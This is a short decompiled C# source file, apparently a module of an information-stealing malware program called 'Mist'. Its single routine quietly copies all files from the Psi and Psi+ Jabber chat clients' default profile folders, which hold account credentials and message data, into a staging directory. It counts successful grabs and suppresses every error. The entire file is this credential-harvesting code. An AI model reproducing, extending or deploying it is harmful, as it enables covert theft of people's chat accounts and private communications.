using System;
using System.IO;

namespace Mist
{
	// Token: 0x02000054 RID: 84
	internal class Psi
	{
		// Token: 0x06000232 RID: 562 RVA: 0x000107DC File Offset: 0x0000E9DC
		public static void Start(string directorypath)
		{
			try
			{
				if (!Directory.Exists(Psi.dir))
				{
					return;
				}
				foreach (FileInfo fileInfo in new DirectoryInfo(Psi.dir).GetFiles())
				{
					Directory.CreateDirectory(directorypath + "\\Jabber\\Psi+\\profiles\\default\\");
					fileInfo.CopyTo(directorypath + "\\Jabber\\Psi+\\profiles\\default\\" + fileInfo.Name);
				}
				Startjabbers.count++;
			}
			catch
			{
			}
			try
			{
				if (Directory.Exists(Psi.dir2))
				{
					foreach (FileInfo fileInfo2 in new DirectoryInfo(Psi.dir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Jabber\\Psi\\profiles\\default\\");
						fileInfo2.CopyTo(directorypath + "\\Jabber\\Psi\\profiles\\default\\" + fileInfo2.Name);
					}
					Startjabbers.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000123 RID: 291
		public static string dir = Help.AppDate + "\\Psi+\\profiles\\default\\";

		// Token: 0x04000124 RID: 292
		public static string dir2 = Help.AppDate + "\\Psi\\profiles\\default\\";
	}
}
